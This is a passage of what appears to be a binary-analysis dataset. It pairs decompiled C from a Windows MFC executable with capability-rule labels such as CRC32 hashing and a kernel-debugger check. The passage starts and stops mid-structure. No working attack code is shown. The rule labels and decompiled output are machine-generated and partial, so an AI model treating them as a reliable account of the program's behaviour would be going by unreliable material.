iVar2 = fcn.0041fdc6(iVar2 << 5);\n                    if (iVar2 == 0) {\n                        *(unaff_EBP + -0x1c) = 0xffffffff;\n                    }\n                }\n                break;\n            }\n            for (; *(unaff_EBP + -0x20) = puVar4,  puVar4 < *(iVar2 * 4 + 0x4685e0) + 0x480; puVar4 = puVar4 + 9) {\n                if ((*(puVar4 + 1) & 1) == 0) {\n                    if (puVar4[2] == 0) {\n                        fcn.00416625(10);\n                        *(unaff_EBP + -4) = 1;\n                        if (puVar4[2] == 0) {\n                            iVar3 = fcn.0041c315(puVar4 + 3, 4000);\n                            if (iVar3 == 0) {\n                                fcn.00410d32(unaff_EBP + -0x10, 0xffffffff);\n                                goto code_r0x0041fff5;\n                            }\n                            puVar4[2] = puVar4[2] + 1;\n                        }\n                        *(unaff_EBP + -4) = 0;\n                        fcn.0041ff61();\n                    }\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar4 + 3);\n                    if ((*(puVar4 + 1) & 1) == 0) {\n                        *puVar4 = 0xffffffff;\n                        *(unaff_EBP + -0x1c) = (puVar4 - *(iVar2 * 4 + 0x4685e0)) / 0x24 + iVar2 * 0x20;\n                        break;\n                    }\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar4 + 3);\n                }\n            }\n            if (*(unaff_EBP + -0x1c) != -1) break;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041fffb();\n    }\ncode_r0x0041fff5:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 963
    },
    "00420460": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t __cdecl fcn.00420460(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    piVar2 = arg_ch;\n    uVar4 = arg_ch[3];\n    arg_8h_00 = arg_ch[4];\n    if (((uVar4 & 0x82) == 0) || ((uVar4 & 0x40) != 0)) {\ncode_r0x00420579:\n        arg_ch[3] = uVar4 | 0x20;\n    }\n    else {\n        if ((uVar4 & 1) != 0) {\n            arg_ch[1] = 0;\n            if ((uVar4 & 0x10) == 0) goto code_r0x00420579;\n            *arg_ch = arg_ch[2];\n            arg_ch[3] = uVar4 & 0xfffffffe;\n        }\n        uVar4 = arg_ch[3];\n        arg_ch[3] = uVar4 & 0xffffffef | 2;\n        arg_ch[1] = 0;\n        arg_ch = NULL;\n        if (((uVar4 & 0x10c) == 0) &&\n           (((piVar2 != 0x464988 && (piVar2 != 0x4649a8)) || (iVar3 = fcn.0041c056(arg_8h_00),  iVar3 == 0)))) {\n            fcn.0041c012(piVar2);\n        }\n        if ((*(piVar2 + 3) & 0x108) == 0) {\n            uVar4 = 2;\n            arg_ch = arg_ch & 0xffff0000 | arg_8h;\n            arg_ch = fcn.0041bf67(arg_8h_00, &arg_ch, 2);\n        }\n        else {\n            iVar3 = piVar2[2];\n            iVar1 = *piVar2;\n            *piVar2 = iVar3 + 2;\n            uVar4 = iVar1 - iVar3;\n            piVar2[1] = piVar2[6] + -2;\n            if (uVar4 < 1) {\n                if (arg_8h_00 == 0xffffffff) {\n                    iVar3 = 0x4645e0;\n                }\n                else {\n                    iVar3 = *((arg_8h_00 >> 5) * 4 + 0x4685e0) + (arg_8h_00 & 0x1f) * 0x24;\n                }\n                if ((*(iVar3 + 4) & 0x20) != 0) {\n                    fcn.0041bcee(arg_8h_00, 0, 2);\n                }\n            }\n            else {\n                arg_ch = fcn.0041bf67(arg_8h_00, iVar3, uVar4);\n            }\n            *piVar2[2] = arg_8h;\n        }\n        if (arg_ch == uVar4) {\n            return arg_8h;\n        }\n        piVar2[3] = piVar2[3] | 0x20;\n    }\n    return 0xffff;\n}\n",
        "token_count": 747
    },
    "004217b7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004217b7(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x457f30, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x4685cc) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4685e0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0041fdc6(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.004131f5();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00421734(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0042182e();\n            goto code_r0x0042184c;\n        }\n    }\n    puVar3 = fcn.004131f5();\n    *puVar3 = 9;\n    puVar3 = fcn.004131fe();\n    *puVar3 = 0;\ncode_r0x0042184c:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 464
    },
    "00429295": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00429295(int32_t noname_0, int32_t noname_1, int32_t noname_2, uint noname_3, uint arg_8h, uint arg_ch, uint arg_10h\n            )\n\n{\n    if ((noname_2 != 0) && (noname_1 != 0)) {\n        if ((~*(noname_0 + 0x18) & 1) == 0) {\n            do {\n                fcn.0040de77(noname_0, noname_1);\n                noname_1 = noname_1 + 4;\n                noname_2 = noname_2 + -1;\n            } while (noname_2 != 0);\n        }\n        else {\n            do {\n                fcn.0040aa41();\n                fcn.0040de16(noname_0, noname_1);\n                noname_1 = noname_1 + 4;\n                noname_2 = noname_2 + -1;\n            } while (noname_2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "0042aed6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042aed6(int32_t *param_1, uint8_t param_2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    uint8_t unaff_retaddr;\n    \n    bVar1 = true;\n    bVar2 = false;\n    if (((param_2 & 4) == 0) || (uVar4 = fcn.0042dd19(),  (uVar4 & 0x10000000) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)(param_1[7]);\n    param_1[0xe] = param_1[0xe] | 0x18;\n    iVar6 = fcn.0042ed3a();\n    pcVar3 = _sym.imp.USER32.dll_UpdateWindow;\ncode_r0x0042af95:\n    while ((!bVar2 || (iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0),  iVar7 != 0))) {\n        do {\n            iVar7 = fcn.0042f190();\n            if (iVar7 == 0) {\n                fcn.0044aa55(0);\n                return -1;\n            }\n            if ((bVar1) && ((*(iVar6 + 4) == 0x118 || (*(iVar6 + 4) == 0x104)))) {\n                fcn.0042de3e(1);\n                (*pcVar3)(param_1[7]);\n                bVar1 = false;\n            }\n            iVar7 = (**(*param_1 + 0x80))();\n            if (iVar7 == 0) {\n                param_1[0xe] = param_1[0xe] & 0xffffffe7;\n                return param_1[0x10];\n            }\n            iVar7 = fcn.0042f0b2(iVar6);\n            if (iVar7 != 0) {\n                bVar2 = true;\n                unaff_EBX = 0;\n            }\n            iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0);\n        } while (iVar7 != 0);\n    }\n    if (bVar1) {\n        fcn.0042de3e(1);\n        (*pcVar3)(param_1[7]);\n        bVar1 = false;\n    }\n    if ((((unaff_retaddr & 1) == 0) && (iVar5 != 0)) && (unaff_EBX == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x121, 0, param_1[7]);\n    }\n    if ((unaff_retaddr & 2) == 0) goto code_r0x0042af76;\n    goto code_r0x0042af91;\ncode_r0x0042af76:\n    iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(param_1[7], 0x36a, 0, unaff_EBX);\n    unaff_EBX = unaff_EBX + 1;\n    if (iVar7 == 0) {\ncode_r0x0042af91:\n        bVar2 = false;\n    }\n    goto code_r0x0042af95;\n}\n",
        "token_count": 793
    },
    "0042b08b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __cdecl fcn.0042b08b(uint32_t arg_8h)\n\n{\n    uint noname_8;\n    uint noname_11;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    bool bVar4;\n    uint *noname_0;\n    uint32_t var_34h;\n    uint var_30h;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00444bf8();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.00411850(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.00444bf8();\n        noname_11 = *0x466de8;\n        noname_8 = *(iVar1 + 8);\n        noname_0 = 0x8;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            noname_0 = &var_34h;\n            var_34h = 0xb;\n            iVar1 = fcn.00429a6d(noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0xb, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, *0x466de8, var_18h, in_stack_ffffffe8, \n                                 \"AfxWnd70s\", 8, var_8h, var_4h, unaff_EBP);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            iVar1 = fcn.00429a6d(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, var_34h, var_30h, \n                                 in_stack_ffffffd0, in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, var_18h, \n                                 in_stack_ffffffe8, \"AfxOleControl70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            iVar1 = fcn.00429a6d(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, 0x10, in_stack_ffffffe8, \n                                 \"AfxControlBar70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            iVar1 = fcn.0042b04a(&var_34h, \"AfxMDIFrame70s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            iVar1 = fcn.0042b04a(&var_34h, \"AfxFrameOrView70s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0042a50d(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0042a50d(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0042a50d(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0042a50d(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0042a50d(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0042a50d(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0042a50d(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0042a50d(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0042a50d(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0042a50d(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0042a50d(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0042a50d(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0042a50d(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.0042a50d(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 2280
    },
    "0042dce6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042dce6(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x39) & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(param_1 + 0x1c), param_2);\n    }\n    else {\n        iVar1 = fcn.00444bf8();\n        (**(**(iVar1 + 0x1038) + 0x24))(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00430b75": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00430b75(uint *param_1, uint8_t param_2)\n\n{\n    uint *puVar1;\n    \n    if ((param_2 & 2) == 0) {\n        fcn.00401980();\n        puVar1 = param_1;\n        if ((param_2 & 1) != 0) {\n            fcn.0042eae6(param_1);\n        }\n    }\n    else {\n        puVar1 = param_1 + -1;\n        fcn.0041263c(param_1, 4, *puVar1, fcn.00401980);\n        if ((param_2 & 1) != 0) {\n            fcn.0042eae6(puVar1);\n        }\n    }\n    return puVar1;\n}\n",
        "token_count": 181
    },
    "004325d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004325d3(uint arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint *var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    var_ch = NULL;\n    var_8h = NULL;\n    var_4h = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(arg_8h);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (var_4h == 0xffffffff) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(arg_8h);\n        fcn.004323b3(uVar2);\n    }\n    if ((*(arg_ch + 8) != var_4h) && ((var_4h & 1) != 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetFileAttributesA)(arg_8h, *(arg_ch + 8));\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.004323b3(uVar2);\n        }\n    }\n    if ((arg_ch[2] | arg_ch[3]) != 0) {\n        fcn.0043251a(arg_ch + 2, &var_24h);\n        if ((arg_ch[4] | arg_ch[5]) != 0) {\n            fcn.0043251a(arg_ch + 4, &var_14h);\n            var_8h = &var_14h;\n        }\n        if ((*arg_ch | arg_ch[1]) != 0) {\n            fcn.0043251a(arg_ch, &var_1ch);\n            var_ch = &var_1ch;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n        if (iVar3 == -1) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.004323b3(uVar2);\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar3, var_ch, var_8h, &var_24h);\n        if (iVar4 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.004323b3(uVar2);\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.004323b3(uVar2);\n        }\n    }\n    if ((*(arg_ch + 8) != var_4h) && ((var_4h & 1) == 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetFileAttributesA)(arg_8h, *(arg_ch + 8));\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.004323b3(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 756
    },
    "00434f6a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434f6a(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 377
    },
    "004355fc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004355fc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00402490();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 == NULL) {\n        fcn.00422e61();\n    }\n    uVar2 = (**(*piVar1 + 0x18))(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405f00(uVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.00401200();\n    uVar2 = *(unaff_EBP + 0xc);\n    extraout_ECX[4] = 0xffffffff;\n    extraout_ECX[6] = uVar2;\n    extraout_ECX[1] = 1;\n    extraout_ECX[7] = 1;\n    extraout_ECX[9] = piVar1;\n    extraout_ECX[0x10] = (-((~uVar2 & 1) != 0) & 0xffffffd0) + 0x40;\n    uVar2 = *(unaff_EBP + 0x14);\n    extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[0x11] = 0x89;\n    extraout_ECX[0xc] = uVar2;\n    extraout_ECX[2] = 0;\n    uVar3 = (**(*piVar1 + 0x50))(3, 0, 0, 0);\n    iVar5 = *(unaff_EBP + 0x10);\n    extraout_ECX[3] = uVar3 & 2;\n    if (iVar5 < 0x80) {\n        extraout_ECX[8] = 0x80;\n        extraout_ECX[0xc] = 0;\n    }\n    else {\n        extraout_ECX[8] = iVar5;\n    }\n    iVar5 = extraout_ECX[8];\n    if (extraout_ECX[0xc] == 0) {\n        uVar3 = (**(*extraout_ECX[9] + 0x50))(3, 0, 0, 0);\n        extraout_ECX[2] = uVar3 & 1;\n        if ((uVar3 & 1) == 0) {\n            uVar2 = fcn.0042eabb(extraout_ECX[8]);\n            extraout_ECX[0xc] = uVar2;\n            extraout_ECX[7] = 0;\n        }\n        else {\n            iVar5 = 0;\n        }\n    }\n    iVar5 = extraout_ECX[0xc] + iVar5;\n    extraout_ECX[0xb] = iVar5;\n    iVar4 = extraout_ECX[0xc];\n    if ((*(extraout_ECX + 6) & 1) != 0) {\n        iVar4 = iVar5;\n    }\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[10] = iVar4;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 909
    },
    "00435bba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00435bba(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    if (param_2 == 0) {\n        arg_ch = *(param_1 + 0x14);\n        arg_8h = 6;\n    }\n    else {\n        if ((~*(param_1 + 0x18) & 1) != 0) goto code_r0x00435be0;\n        arg_ch = *(param_1 + 0x14);\n        arg_8h = 1;\n    }\n    fcn.0043586f(arg_8h, arg_ch);\ncode_r0x00435be0:\n    if (*(param_2 + 8) == 0xffff) {\n        fcn.00422e47();\n    }\n    fcn.00435ab6(0);\n    puVar2 = fcn.00427f9e(param_2);\n    uVar1 = *puVar2;\n    if (uVar1 == 0) {\n        fcn.0040dab1(0xffff);\n        fcn.0043557d(param_1);\n        fcn.00435aa2();\n        puVar3 = fcn.00427f9e(param_2);\n        *puVar3 = *(param_1 + 0x34);\n        *(param_1 + 0x34) = *(param_1 + 0x34) + 1;\n    }\n    else if (uVar1 < 0x7fff) {\n        fcn.0040dab1(uVar1 | 0x8000);\n    }\n    else {\n        fcn.0040dab1(0x7fff);\n        fcn.0040db28(uVar1 | 0x80000000);\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "0043a20b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a20b(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *var_8h;\n    int32_t *piStack8;\n    \n    uVar1 = param_1[0x1f];\n    param_1[0x27] = 0;\n    if (((uVar1 & 1) == 0) || ((uVar1 & 4) == 0)) {\n        if ((uVar1 & 0xa000) == 0) {\n            uVar2 = 0x50;\n        }\n        else {\n            uVar2 = 0x4a;\n        }\n    }\n    else {\n        uVar2 = 0x46;\n    }\n    var_8h = param_1;\n    piStack8 = param_1;\n    (**(*param_1 + 0x134))(&var_8h, 0, uVar2);\n    return;\n}\n",
        "token_count": 220
    },
    "0043a4b6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043a4b6(uint arg_8h, int32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint *puVar3;\n    uint var_30h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint8_t var_fh;\n    uint var_eh;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    (**(*in_ECX + 0x110))(0x417, arg_8h, &var_18h);\n    *(arg_ch + 2) = *(arg_ch + 2) ^ 4;\n    var_eh._0_1_ = 0;\n    var_eh._1_1_ = 0;\n    *(arg_ch + 10) = 0;\n    *(arg_ch + 0xb) = 0;\n    iVar2 = fcn.00412110(arg_ch, &var_18h, 0x14);\n    if (iVar2 != 0) {\n        var_20h = fcn.0042dd19();\n        fcn.0042dd4d(0x10000000, 0, 0);\n        (**(*in_ECX + 0x110))(0x416, arg_8h, 0);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        var_1ch = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], 0x43d, 0, 0);\n        (*pcVar1)(in_ECX[7], 0xb, 0, 0);\n        (*pcVar1)(in_ECX[7], 0x43c, var_1ch + 1, 0);\n        (*pcVar1)(in_ECX[7], 0x43c, var_1ch, 0);\n        (*pcVar1)(in_ECX[7], 0xb, 1, 0);\n        (**(*in_ECX + 0x110))(0x415, arg_8h, arg_ch);\n        fcn.0042dd4d(0, var_20h & 0x10000000, 0);\n        if ((((*(arg_ch + 9) ^ var_fh) & 1) == 0) && (((*(arg_ch + 9) & 1) == 0 || (*arg_ch == var_18h)))) {\n            iVar2 = (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_30h);\n            if (iVar2 == 0) goto code_r0x0043a5eb;\n            puVar3 = &var_30h;\n        }\n        else {\n            puVar3 = NULL;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(in_ECX[7], puVar3, 1);\n    }\ncode_r0x0043a5eb:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 703
    },
    "0043b434": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043b434(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_30h;\n    \n    iVar1 = fcn.0042b38f();\n    if (iVar1 != 0) {\n        var_50h = 0x50;\n        var_4ch = 0x11;\n        (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_50h);\n        uVar2 = fcn.0042b459(var_30h);\n        piVar3 = fcn.0042ffac(0x4522ac, uVar2);\n        if (piVar3 == NULL) {\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(var_30h, 0xfffffff0);\n            uVar4 = uVar4 >> 0x1c & 1;\n        }\n        else {\n            uVar4 = (**(*piVar3 + 0x150))();\n        }\n        uVar5 = ~(var_48h >> 3) & 1;\n        if (uVar4 != uVar5) {\n            (*_sym.imp.USER32.dll_ShowWindow)(var_30h, -(uVar5 != 0) & 5);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 359
    },
    "0043bebc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
